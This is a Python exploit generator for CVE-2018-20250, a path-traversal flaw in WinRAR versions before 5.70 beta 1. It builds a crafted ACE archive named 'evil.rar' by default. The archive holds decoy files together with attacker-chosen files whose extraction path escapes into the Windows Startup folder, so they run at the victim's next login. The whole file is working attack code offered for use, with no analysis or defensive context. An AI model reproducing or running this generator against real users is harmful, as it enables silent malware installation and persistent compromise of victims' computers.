#!/usr/bin/env python3
import acefile
import argparse
import binascii
import struct
import os

class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    
def getArgs():
    parser = argparse.ArgumentParser(description='Evil WinRAR Archive Generator (CVE-2018-20250) - Target: WinRAR < 5.70 beta 1\nBy @manulqwerty - ironhackers.es')
    parser.add_argument('-o',dest='filename',type=str,help='Output filename - Default: evil.rar',default='evil.rar')
    parser.add_argument('-e',metavar='evil_file',nargs='+', dest='evil',type=str,help='Evil files',required=True)
    parser.add_argument('-g',metavar='good_file',nargs='+', dest='good',type=str,help='Good files',required=True)
    parser.add_argument('-p',dest='path',type=str,help='Path to uncompress the evil files - Default: C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe',default='C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\')
    return parser.parse_args()
    
def printHeader():
    print(color.BOLD + color.GREEN + '''
          _ _  __      ___      ___    _   ___ 
  _____ _(_) | \ \    / (_)_ _ | _ \  /_\ | _ \\
 / -_) V / | |  \ \/\/ /| | ' \|   / / _ \|   /
 \___|\_/|_|_|   \_/\_/ |_|_||_|_|_\/_/ \_\_|_\\'''  + color.END + color.RED + 
 '''\n\n                                        by @manulqwerty\n\n''' + color.BLUE + color.BOLD + 
 '''----------------------------------------------------------------------\n''' + color.END)
    
    
def writeShellcode(shellcode,filename):
    with open(filename , 'wb+') as f:
        f.write(binascii.unhexlify(shellcode))
def addShellcode(shellcode,filename):
    with open(filename , 'ab+') as f:
        f.write(binascii.unhexlify(shellcode))
def readShellcode(filename):
    with open (filename , 'rb') as f:
        return binascii.hexlify(f.read()).decode('utf-8').upper()
     
def hex2raw(hex_value,N):
    hex_value = hex_value.zfill(N)
    return ''.join([hex_value[x-1:x+1] for x in range(len(hex_value)-1,0,-2)]).ljust(N,'0')
    
def buildShellcode(filename , path=''):
    if path == '':
        path = filename
    hdr_crc_raw = '6789'
    hdr_size_raw = hex(len(path)+31)[2:]
    hdr_size_raw = hex2raw(hdr_size_raw,4)
    packsize_raw = hex(os.path.getsize(filename))[2:]
    packsize_raw = hex2raw(packsize_raw,8)
    origsize_raw = packsize_raw
    with open(filename,'rb') as f:
        crc32_raw = hex(acefile.ace_crc32(f.read()))[2:]
    crc32_raw = hex2raw(crc32_raw,8)
    filename_len_raw = hex(len(path))[2:]
    filename_len_raw = hex2raw(filename_len_raw,4)
    filename_raw = "".join("{:x}".format(ord(c)) for c in path)
    shellcode = hdr_crc_raw + hdr_size_raw + "010180" + packsize_raw \
              + origsize_raw + "63B0554E20000000" + crc32_raw + "00030A005445"\
              + filename_len_raw + filename_raw + "01020304050607080910A1A2A3A4A5A6A7A8A9"
    return shellcode
    
def str2bytes(str_input):
    return binascii.a2b_hex(str_input.upper())
    
def calCRC(shellcode):
    buf = str2bytes(shellcode)[:4]
    hcrc, hsize = struct.unpack('<HH', buf)
    buf = str2bytes(shellcode)[4:hsize+4]
    myHcrc = hex2raw(hex(acefile.ace_crc16(buf))[2:].upper(),4)
    return myHcrc
    
def buildFile(filename, path, dest_filename):
    shellcode = buildShellcode (filename , path)
    addShellcode(shellcode,dest_filename)
    my_hcrc = calCRC(shellcode)
    hcrc_shellcode = shellcode.replace('6789',my_hcrc)
    content = readShellcode(dest_filename)
    content = content.replace('6789',my_hcrc)
    content = content.replace("01020304050607080910A1A2A3A4A5A6A7A8A9", readShellcode(filename))
    writeShellcode(content,dest_filename)

if __name__ == '__main__':
    args = getArgs()
    printHeader()
    header_shellcode = '6B2831000000902A2A4143452A2A141402001018564E974FF6AA00000000162A554E524547495354455245442056455253494F4E2A'
    writeShellcode(header_shellcode,args.filename)
    
    for i in args.good:
        buildFile(i,'',args.filename)
        
    for i in args.evil:
        path = args.path + i
        buildFile(i,path,args.filename)
    
    with acefile.open(args.filename) as f:
        for member in f:
            if member.is_dir():
                continue
            if f.test(member):
                exit
            else:
                print("CRC FAIL:   %s" % member.filename)
                
    print( color.YELLOW + '[+] Evil archive generated successfully: ' + args.filename )
    print('[+] Evil path: %s\n' % args.path + color.END)

    
    
